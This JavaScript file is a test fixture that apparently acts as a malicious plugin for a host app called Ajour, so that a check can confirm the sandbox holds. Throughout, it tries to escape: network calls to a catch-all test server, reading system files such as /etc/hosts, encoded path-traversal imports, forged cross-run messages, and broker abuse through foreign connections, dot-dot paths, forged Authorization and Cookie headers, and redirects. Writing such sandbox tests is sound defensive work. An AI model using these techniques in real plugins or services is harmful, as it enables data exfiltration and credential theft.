// A malicious API 4 plugin: every way out it tries must fail. Each attempt
// reports whether it got anywhere; the check also counts what reached its
// catch-all server.

const settle = (promise, ms = 3_000) =>
  Promise.race([
    promise,
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error("no answer")), ms),
    ),
  ]);

async function attempt(name, run) {
  try {
    const value = await run();
    return { name, escaped: true, value: String(value).slice(0, 200) };
  } catch (error) {
    return {
      name,
      escaped: false,
      error: `${error?.name ?? "Error"}: ${String(error?.message ?? error).slice(0, 200)}`,
    };
  }
}

function socket(url) {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(url);
    ws.onopen = () => resolve("open");
    ws.onerror = () => reject(new Error("WebSocket failed"));
  });
}

function xhr(url) {
  return new Promise((resolve, reject) => {
    const request = new XMLHttpRequest();
    request.open("GET", url);
    request.onload = () => resolve(request.status);
    request.onerror = () => reject(new Error("XMLHttpRequest failed"));
    request.send();
  });
}

function eventSource(url) {
  return new Promise((resolve, reject) => {
    const source = new EventSource(url);
    source.onopen = () => resolve("open");
    source.onerror = () => {
      source.close();
      reject(new Error("EventSource failed"));
    };
  });
}

/**
 * Tries every way out, given the check's catch-all server, Ajour's local
 * API, another plugin's origin and a file in Ajour's user data.
 */
export async function tryExits({
  catchAll,
  localApi,
  otherPlugin,
  userDataFile,
}) {
  return [
    await attempt("fetch", () => settle(fetch(`${catchAll}/fetch`))),
    await attempt("fetch-public", () => settle(fetch("https://example.com/"))),
    await attempt("fetch-local-api", () =>
      settle(fetch(`${localApi}/api/plugins`)),
    ),
    await attempt("fetch-private-name", () =>
      settle(fetch("http://printer.local/")),
    ),
    await attempt("fetch-private-address", () =>
      settle(fetch("http://192.168.1.1/")),
    ),
    await attempt("fetch-other-plugin", () =>
      settle(fetch(`${otherPlugin}/lib/plugin.mjs`)),
    ),
    await attempt("fetch-file", () =>
      settle(fetch("file:///C:/Windows/win.ini")),
    ),
    await attempt("fetch-file-posix", () => settle(fetch("file:///etc/hosts"))),
    await attempt("fetch-user-data", () => settle(fetch(userDataFile))),
    await attempt("import-user-data", () => settle(import(userDataFile))),
    await attempt("import-remote", () =>
      settle(import(`${catchAll}/module.js`)),
    ),
    await attempt("import-other-plugin", () =>
      settle(import(`${otherPlugin}/lib/plugin.mjs`)),
    ),
    // Out of its own package, to the next plugin's, through its own origin.
    await attempt("import-traversal", () =>
      settle(import("/..%2ffixture-tracker%2flib%2fplugin.mjs")),
    ),
    await attempt("import-traversal-backslash", () =>
      settle(import("/..%5cfixture-tracker%5clib%5cplugin.mjs")),
    ),
    await attempt("websocket", () =>
      settle(socket(catchAll.replace("http:", "ws:") + "/ws")),
    ),
    await attempt("xhr", () => settle(xhr(`${catchAll}/xhr`))),
    await attempt("event-source", () =>
      settle(eventSource(`${catchAll}/events`)),
    ),
    await attempt(
      "send-beacon",
      () =>
        navigator.sendBeacon(`${catchAll}/beacon`, "x") ||
        Promise.reject(new Error("sendBeacon refused")),
    ),
    await attempt("service-worker", () =>
      settle(navigator.serviceWorker.register("/sw.js")),
    ),
    await attempt("shared-worker", () => new SharedWorker("/sw.js")),
    await attempt("window-open", () => {
      const opened = self.open(`${catchAll}/open`);
      if (!opened) throw new Error("window.open gave nothing");
      return opened;
    }),
    await attempt("navigation", () => {
      self.location.href = `${catchAll}/navigate`;
      if (self.location.href !== `${catchAll}/navigate`) {
        throw new Error("The location didn't change.");
      }
      return self.location.href;
    }),
    await attempt("webtransport", () =>
      settle(
        new WebTransport(`https://127.0.0.1:${new URL(catchAll).port}/wt`)
          .ready,
      ),
    ),
    await attempt("rtc", () => new RTCPeerConnection()),
    await attempt("node", () => require("node:fs").readFileSync("/etc/hosts")),
    await attempt("process", () => process.env.PATH),
  ];
}

/** Holds a run open, so the check can forge calls while it runs. */
export function hold({ ms }) {
  return new Promise((resolve) => setTimeout(() => resolve("held"), ms));
}

/**
 * Posts calls that claim other runs, the way plugin code can reach its
 * page. The page sends each as its own run's, so none reaches another's
 * broker: the check counts what the service received.
 */
export async function claimOtherRuns({ runIds, connectionId }) {
  for (const runId of runIds) {
    self.postMessage({
      type: "http",
      runId,
      callId: 1_000 + Number(runId),
      request: { connectionId, method: "GET", path: "/api/items" },
    });
  }
  await new Promise((resolve) => setTimeout(resolve, 500));
  return "posted";
}

export async function validateConnection(connection) {
  return { normalizedConfig: connection.config, connectionSummary: {} };
}

/** A request through the broker: a way out if it answers 2xx. */
async function brokered(request) {
  const response = await settle(ajour.http(request));
  const text = await response.text();
  if (!response.ok) throw new Error(`answered ${response.status}`);
  return `${response.status} ${text}`;
}

/**
 * Turns the broker against itself from a sync: another plugin's connection,
 * an absolute or climbing path, the headers no plugin may set, a redirect to
 * another origin, and a service that echoes the token. The sync's items
 * carry each attempt, so the check reads them.
 */
export async function syncConnection(connection) {
  const { otherConnection, probe } = connection.config;
  const get = (fields) => ({
    connectionId: connection.id,
    method: "GET",
    path: "/api/me",
    ...fields,
  });
  const attempts = [
    // What the plugin may do: the control that shows the broker answers.
    await attempt("control", () => brokered(get())),
    await attempt("other-plugin-connection", () =>
      brokered(get({ connectionId: otherConnection })),
    ),
    await attempt("absolute-url", () =>
      brokered(get({ path: `${probe}/absolute` })),
    ),
    await attempt("scheme-relative-url", () =>
      brokered(get({ path: `//${new URL(probe).host}/relative` })),
    ),
    await attempt("dot-dot", () =>
      brokered(get({ path: "/api/me/../../../climbed" })),
    ),
    // Above the connection's address, onto a path its endpoints name.
    await attempt("dot-dot-above-address", () =>
      brokered(get({ path: "/../api/me" })),
    ),
    await attempt("dot-dot-encoded", () =>
      brokered(get({ path: "/api/me/%2e%2e/%2e%2e/%2e%2e/climbed" })),
    ),
    ...(await Promise.all(
      ["Authorization", "Cookie", "Host", "Proxy-Authorization"].map((name) =>
        attempt(`header-${name.toLowerCase()}`, () =>
          brokered(get({ headers: { [name]: "Bearer forged" } })),
        ),
      ),
    )),
    await attempt("cross-origin-redirect", () =>
      brokered(get({ query: { case: "redirect" } })),
    ),
  ];
  // The service echoes the Authorization header it got: the broker must
  // take the token out of what the plugin reads.
  let echoed;
  try {
    const response = await settle(ajour.http(get({ query: { case: "echo" } })));
    echoed = `${response.status} ${await response.text()} ${JSON.stringify(response.headers)}`;
  } catch (error) {
    echoed = `error ${String(error?.message ?? error)}`;
  }
  return {
    items: [
      ...attempts.map((result) => ({ kind: "attempt", result })),
      { kind: "echo", result: echoed },
    ].map((entry, index) => ({
      source: "fixture-escape",
      connectionId: connection.id,
      connectionLabel: connection.label,
      tenantLabel: connection.tenantLabel,
      sourceId: String(index + 1),
      externalId: `E-${index + 1}`,
      title: JSON.stringify(entry).slice(0, 400),
      workItemType: "Task",
      depth: 0,
    })),
  };
}
